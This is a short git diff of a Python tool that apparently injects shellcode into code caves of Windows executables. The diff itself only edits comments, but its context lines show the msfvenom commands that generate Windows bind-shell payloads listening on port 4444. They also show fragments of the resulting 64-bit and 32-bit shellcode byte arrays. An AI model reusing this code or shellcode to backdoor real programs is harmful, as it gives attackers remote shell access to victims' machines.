@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+#pip install pefile
 
 import sys
 import os
@@ -119,7 +120,7 @@ def FindCave():
 
     filedata.close()
 
-#shellcode 64bits
+#shellcode 64 bits
 # msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -i 0 -f c
 shellcode64 = bytes (
 b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
@@ -158,7 +159,7 @@ b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
 b"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
 )
 
-#shellcode 32bits
+#shellcode 32 bits
 # msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -i 0 -f c
 shellcode = bytes(
 b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
